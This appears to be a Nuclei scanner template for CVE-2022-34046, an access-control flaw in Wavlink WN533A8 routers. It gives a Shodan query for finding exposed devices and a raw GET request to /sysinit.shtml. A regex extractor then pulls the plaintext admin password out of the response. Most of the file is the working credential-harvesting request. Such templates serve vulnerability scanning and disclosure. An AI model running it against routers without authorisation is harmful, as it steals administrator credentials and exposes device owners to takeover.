id: CVE-2022-34046
info:
  author: For3stCo1d
  description: 'An access control issue in Wavlink WN533A8 M33A8.V5030.190716 allows
    attackers to obtain usernames and passwords via view-source:http://IP_ADDRESS/sysinit.shtml?r=52300
    and searching for [logincheck(user);].

    '
  metadata:
    shodan-query: http.title:"Wi-Fi APP Login"
    verified: true
  name: Wavlink Sysinit.shtml - Password Exposure
  reference:
  - https://drive.google.com/file/d/18ECQEqZ296LDzZ0wErgqnNfen1jCn0mG/view?usp=sharing
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34046
  severity: high
  tags: cve,cve2022,wavlink,router,exposure
requests:
- extractors:
  - regex:
    - syspasswd="(.+?)"
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - var syspasswd="
    - <title>APP</title>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /sysinit.shtml?r=52300 HTTP/1.1

    Host: {{Hostname}}

    '
